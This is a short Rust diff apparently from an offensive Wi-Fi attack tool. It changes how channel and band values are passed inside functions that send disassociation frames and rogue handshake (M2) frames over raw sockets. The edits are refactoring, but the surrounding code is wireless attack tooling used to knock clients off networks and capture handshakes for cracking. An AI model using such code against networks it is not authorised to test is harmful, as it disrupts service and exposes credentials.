@@ -145,7 +145,7 @@ pub fn disassoc_attack(oxide: &mut OxideRuntime, ap_mac: &MacAddress) -> Result<
         if ap_data
             .channel
             .clone()
-            .is_some_and(|f| f.get_band() == WiFiBand::Band6GHz)
+            .is_some_and(|f| f.0 == WiFiBand::Band6GHz)
         {
             let frx = build_disassocation_from_ap(
                 ap_mac,
@@ -598,7 +598,7 @@ pub fn rogue_m2_attack_directed(
             &probe.header.address_1,
             &ssid,
             oxide.counters.sequence3(),
-            oxide.if_hardware.current_channel.get_channel_number(),
+            oxide.if_hardware.current_channel.try_into().unwrap(),
         );
         write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx)?;
         station.interactions += 1;
@@ -663,7 +663,7 @@ pub fn rogue_m2_attack_undirected(
             &oxide.target_data.rogue_client,
             &ssid,
             oxide.counters.sequence3(),
-            oxide.if_hardware.current_channel.get_channel_number(),
+            oxide.if_hardware.current_channel,
         );
         write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx)?;
         station.interactions += 1;
@@ -699,7 +699,7 @@ pub fn rogue_m2_attack_undirected(
                 &oxide.target_data.rogue_client,
                 &ap.ssid.clone().unwrap(),
                 oxide.counters.sequence3(),
-                oxide.if_hardware.current_channel.get_channel_number(),
+                oxide.if_hardware.current_channel,
             );
             write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx)?;
 
